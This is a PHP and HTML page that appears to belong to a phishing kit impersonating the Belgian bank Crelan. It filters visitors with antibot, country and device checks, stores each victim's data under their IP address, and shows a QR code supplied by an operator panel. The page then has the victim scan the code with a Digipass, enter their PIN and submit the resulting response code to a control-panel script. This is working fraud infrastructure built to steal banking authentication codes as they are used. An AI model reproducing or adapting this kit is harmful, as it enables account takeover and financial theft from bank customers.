<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_QR'];
    $QR_image_target = $user_info['QR_image_target'];

    if ($user_info['error_QR'] == 1) {
        $get_name_page = "Page QR IMAGE Error";
        $get_step = "qr-error";
    } else {
        $get_name_page = "Page QR IMAGE";
        $get_step = "qr";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>WEB PAGE</title>
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="../img/logo.png" alt="">
            </div>
            <div class="lang-btn">
                <span class="text-lang">NL</span> <img src="../img/arrow-nav.png" alt="">
            </div>
        </div>
        <div class="content-main-section">
            <h1 class="title-login">Identificatie</h1>
            <?php
                if ($user_info['error_QR'] == 1) {
                    echo '
                    <div class="message-error-pages">
                        <i class="fa-solid fa-triangle-exclamation"></i>
                        De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.
                    </div>';
                }
            ?>
            <form action="../control-panel/check-action.php" method="post" id="fsdpElement" class="f-s-d-p-element-other">
                <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <div class="coul-container" style="flex-direction: column !important;">
                    <div class="prt-qr-image">
                        <img src="<?php echo $QR_image_target; ?>" alt="">
                    </div>
                    <div class="coul-4-other" style="width: 100% !important;">
                        <div class="number-and-text">
                            <div class="number">1</div>
                            <div class="text">
                                Zet de digipass aan met de <strong>groene knop.</strong>
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">2</div>
                            <div class="text">
                                <strong>Scan</strong> de afbeelding met uw digipass.
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">3</div>
                            <div class="text">
                                <strong>Voer uw PIN in</strong> en bevestig met <strong>'OK'</strong>.
                                <br>
                                Druk <strong>nogmaals</strong> op <strong>'OK'</strong> om uw response code te ontvangen.
                            </div>
                        </div>
                        <div class="number-and-text">
                            <div class="number">4</div>
                            <div class="coul-submit">
                                <div class="prt-3" id="div1">
                                    <label for="qrCode">Vul in het veld hieronder de <strong>response code</strong> in die op het scherm van de digipass verschijnt:</label>
                                    <input type="text" name="qr_code" id="qrCode" class="i-element">
                                    <small id="messageError1" class="m-e-i"><img src="../img/icon-error.png" alt=""> Dit veld is verplicht.</small>
                                </div>
                                <div class="prt-btn">
                                    <button type="submit" name="b_s_d_p" id="bsdpElement" class="btn-element">Verdergaan</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </form> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer">Meer info?</span> <span class="ship">—</span> <span class="link-footer">Privacy</span> <span class="ship">—</span> <span class="link-footer">Reglement myCrelan</span> <span class="ship">—</span> <span class="link-footer">Security myCrelan</span> <span class="ship">—</span> 
            </div>
            <p>Alle rechten voorbehouden © Crelan 2026</p>
        </div>
    </div>
    <!-- Footer Section -->

    <!-- Script Js -->
    <script src="../js/script-step-two.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>
